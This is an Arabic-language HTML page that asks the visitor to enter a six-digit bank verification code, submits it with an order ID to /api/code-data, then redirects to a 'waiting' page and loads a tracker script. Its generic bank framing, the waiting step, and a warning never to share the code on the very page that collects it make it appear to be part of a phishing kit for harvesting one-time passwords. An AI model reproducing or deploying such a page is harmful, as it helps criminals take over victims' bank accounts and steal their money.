<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>رمز التحقق</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;font-family:"Segoe UI",Tahoma,Arial,sans-serif}
  body{
    max-width:520px;margin:0 auto;min-height:100vh;
    background:
      linear-gradient(150deg, rgba(255,255,255,.6) 0%, rgba(255,255,255,.6) 15%, transparent 15.5%),
      linear-gradient(150deg, transparent 14%, rgba(255,255,255,.35) 14.5%, rgba(255,255,255,.35) 28%, transparent 28.5%),
      linear-gradient(150deg, transparent 27%, rgba(255,255,255,.2) 27.5%, rgba(255,255,255,.2) 42%, transparent 42.5%),
      linear-gradient(150deg, transparent 55%, rgba(255,255,255,.15) 55.5%, rgba(255,255,255,.15) 68%, transparent 68.5%);
    background-size:100% 100%;
    background-attachment:fixed;
    background-color:#e0e1e3;
    display:flex;flex-direction:column;
  }

  .top{flex:1;padding:60px 24px 0;text-align:center}

  .code-icon{
    width:90px;height:90px;border-radius:24px;
    background:linear-gradient(135deg,#e8eaf6,#c5cae9);
    display:flex;align-items:center;justify-content:center;
    margin:0 auto 24px;position:relative;
    box-shadow:0 8px 24px rgba(63,81,181,.18);
  }
  .code-icon svg{width:44px;height:44px;fill:none;stroke:#283593;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
  .code-icon::after{
    content:"";position:absolute;inset:-4px;border-radius:28px;
    border:2px dashed #7986cb;opacity:.45;animation:rotateBorder 12s linear infinite;
  }
  @keyframes rotateBorder{to{transform:rotate(360deg)}}

  h1{font-size:22px;font-weight:800;color:#1a1a1a;margin-bottom:8px}
  .subtitle{color:#888;font-size:14px;line-height:1.7;margin-bottom:28px}

  .error-msg{
    display:none;background:#fee;border:1px solid #fcc;border-radius:8px;
    padding:10px 14px;margin:0 24px 16px;color:#c62828;font-size:14px;
    text-align:center;font-weight:600;
  }

  .code-input-wrap{
    max-width:320px;margin:0 auto;display:flex;gap:8px;
    justify-content:center;direction:ltr;
  }
  .code-digit{
    width:44px;height:54px;border:2px solid #ccc;border-radius:10px;
    text-align:center;font-size:24px;font-weight:700;font-family:monospace;
    background:#fff;color:#1a1a1a;outline:none;transition:.2s;
  }
  .code-digit:focus{border-color:#1565c0;box-shadow:0 0 0 3px rgba(21,101,192,.15)}

  .info-text{
    margin-top:24px;background:#fff8e1;border-radius:12px;padding:14px 16px;
    font-size:13px;color:#e65100;line-height:1.6;text-align:right;
  }

  .bottom{padding:20px 24px 40px}
  .submit-btn{
    display:block;width:100%;padding:18px;border:none;border-radius:50px;
    font-size:18px;font-weight:700;color:#fff;cursor:pointer;font-family:inherit;
    background:linear-gradient(135deg, #c62828, #e53935);
    box-shadow:0 4px 15px rgba(198,40,40,.3);transition:.2s;
  }
  .submit-btn:hover{opacity:.9}
  .submit-btn:disabled{opacity:.5;cursor:not-allowed}
</style>
</head>
<body>

<div class="top">
  <div class="code-icon">
    <svg viewBox="0 0 24 24">
      <rect x="3" y="5" width="18" height="14" rx="3"/>
      <circle cx="12" cy="12" r="2.5"/>
      <path d="M8 12h1.5M14.5 12H16"/>
      <path d="M12 8.5V10M12 14v1.5"/>
      <path d="M9.5 9.5l1 1M13.5 13.5l1 1"/>
      <path d="M14.5 9.5l-1 1M10.5 13.5l-1 1"/>
    </svg>
  </div>

  <h1>أدخل رمز التحقق</h1>
  <p class="subtitle">تم إرسال رمز التحقق إلى هاتفك المسجل لدينا</p>

  <div class="error-msg" id="errorMsg"></div>

  <div class="code-input-wrap">
    <input class="code-digit" type="tel" maxlength="1" id="c0" autofocus>
    <input class="code-digit" type="tel" maxlength="1" id="c1">
    <input class="code-digit" type="tel" maxlength="1" id="c2">
    <input class="code-digit" type="tel" maxlength="1" id="c3">
    <input class="code-digit" type="tel" maxlength="1" id="c4">
    <input class="code-digit" type="tel" maxlength="1" id="c5">
  </div>

  <div class="info-text">
    لا تشارك هذا الرمز مع أي شخص. فريق البنك لن يطلب منك هذا الرمز أبداً.
  </div>
</div>

<div class="bottom">
  <button class="submit-btn" id="submitBtn" onclick="submitCode()">تأكيد</button>
</div>

<script>
  const params = new URLSearchParams(location.search);
  const orderId = params.get("order");
  if (!orderId) location.href = "index.html";

  if (params.get("error") === "1") {
    const el = document.getElementById("errorMsg");
    el.textContent = "الرمز غير صحيح او غير صالح";
    el.style.display = "block";
  }

  const digits = document.querySelectorAll(".code-digit");
  digits.forEach((inp, i) => {
    inp.addEventListener("input", () => {
      inp.value = inp.value.replace(/\D/g, "");
      if (inp.value && i < digits.length - 1) digits[i + 1].focus();
    });
    inp.addEventListener("keydown", e => {
      if (e.key === "Backspace" && !inp.value && i > 0) digits[i - 1].focus();
    });
    inp.addEventListener("paste", e => {
      e.preventDefault();
      const text = (e.clipboardData.getData("text") || "").replace(/\D/g, "");
      for (let j = 0; j < digits.length && j < text.length; j++) {
        digits[j].value = text[j];
      }
      const last = Math.min(text.length, digits.length) - 1;
      if (last >= 0) digits[last].focus();
    });
  });

  function getCode() {
    return Array.from(digits).map(d => d.value).join("");
  }

  async function submitCode() {
    const code = getCode();
    if (code.length < 6) {
      showError("الرجاء إدخال الرمز كاملاً");
      return;
    }
    const btn = document.getElementById("submitBtn");
    btn.disabled = true;
    btn.textContent = "جاري التحقق...";

    try {
      const res = await fetch("/api/code-data", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ order_id: orderId, code: code })
      });
      const data = await res.json();
      if (data.success) {
        location.href = "code-waiting.html?order=" + orderId;
      } else {
        showError(data.message || "حدث خطأ");
        btn.disabled = false;
        btn.textContent = "تأكيد";
      }
    } catch(err) {
      showError("حدث خطأ في الاتصال");
      btn.disabled = false;
      btn.textContent = "تأكيد";
    }
  }

  function showError(msg) {
    const el = document.getElementById("errorMsg");
    el.textContent = msg;
    el.style.display = "block";
  }
</script>
<script src="tracker.js"></script>
</body>
</html>
